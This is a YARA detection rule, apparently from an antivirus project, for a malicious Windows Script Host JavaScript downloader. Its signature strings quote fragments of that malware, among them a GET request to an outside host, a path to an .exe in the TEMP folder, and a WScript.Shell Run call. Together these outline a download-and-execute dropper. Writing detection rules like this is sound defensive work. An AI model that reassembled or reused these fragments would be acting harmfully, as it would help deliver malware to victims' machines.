rule sig_20160328_c362085d556b1ba65f608003793fb2ff {
  meta:
    description = "datamaliciousorder - file 20160328_c362085d556b1ba65f608003793fb2ff.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dd29caf1390081aa8f75cade61e8ebf030ce35860b31de1ba4f723f070b5c16a"

  strings:
    $s1  = "function Zvnect() {return Plsrdor[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"vQ57Zz2SsC.exe\";};" fullword ascii
    $s2  = "Bsijoeqbxf[Girwifjlnm](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Itrfhkthzm](Rxguu() * 11)} while (Bsijoeqbxf[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Plsrdor = function Dgpir() {return WScript[Ojtyece](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Rnnbawrk(Hnikej, Niqigvycx){return Hnikej - Niqigvycx;};" fullword ascii
    $s6  = "function Wcnieu() {return ((Bjklmyioyf == true) && (Bjklmyioyf == Vjnhme)) ? 1 : Nszlfn;};" fullword ascii
    $s7  = "function Bskjtvtuvf(Gpxhsjlwqn){Plsrdor[\"Run\"](Gpxhsjlwqn, Nszlfn, Nszlfn);};" fullword ascii
    $s8  = "var Rxcta = false;" fullword ascii
    $s9  = "Vjnhme = true; " fullword ascii
    $s10 = "function Fbdbznptn(Zjkcjsl) {var Gbvqi = (1, 2, 3, 4, 5, Zjkcjsl); return Gbvqi;};" fullword ascii
    $s11 = "var Bjklmyioyf = false;" fullword ascii
    $s12 = "function Jmmvxb()" fullword ascii
    $s13 = "function Zlegfuvsat(){return Ojtyece;};" fullword ascii
    $s14 = " while (Hqlezwmjfd){" fullword ascii
    $s15 = "function Rxguu(){return 22;};" fullword ascii
    $s16 = "var Yqsuriam = new this[\"Date\"]();" fullword ascii
    $s17 = "function Bqgnbu(){return Jbilkj;};" fullword ascii
    $s18 = "Bjklmyioyf = true; " fullword ascii
    $s19 = "return Rnnbawrk(Dmexkwoy, Qclloui);" fullword ascii
    $s20 = "var Vjnhme = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}